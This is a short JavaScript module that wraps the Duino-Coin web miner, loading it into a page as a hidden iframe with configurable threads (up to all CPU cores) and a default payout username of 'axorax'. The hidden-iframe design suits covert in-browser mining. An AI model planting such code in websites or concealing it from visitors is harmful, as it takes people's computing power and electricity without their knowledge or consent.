export class Duco {

    constructor (options) {
        this.username = options.username || 'axorax';
        this.threads = options.threads=='hardwareConcurrency'?window.navigator.hardwareConcurrency:options.threads||1;
        this.rigid = options.rigid || 'duco.js';
        this.key = options.key || '';
        this.id = options.id || ('duco-js-' + String(Math.random().toString(36).slice(2, 10)));
        this.url = `https://server.duinocoin.com/webminer.html?username=${this.username}&threads=${this.threads}&rigid=${this.rigid}&keyinput=${this.key}`;
        console.log(this.threads)
    }

    start() {
        const iframe = document.createElement('iframe');
        iframe.src = this.url;
        iframe.id = this.id;
        iframe.style.cssText = 'display:none;';
        document.body.append(iframe);
    }

    startAfter(time) {
        setTimeout(() => {
            this.start();
        }, time)
    }

    stop() {
        document.querySelectorAll(`#${this.id}`).forEach(e=>e.remove());
    }

    stopAfter(time) {
        setTimeout(() => {
            this.stop();
        }, time)
    }

    addStyle(style) {
        document.querySelectorAll(`#${this.id}`).forEach(e=>e.style.cssText=style);
    }
}

export default Duco;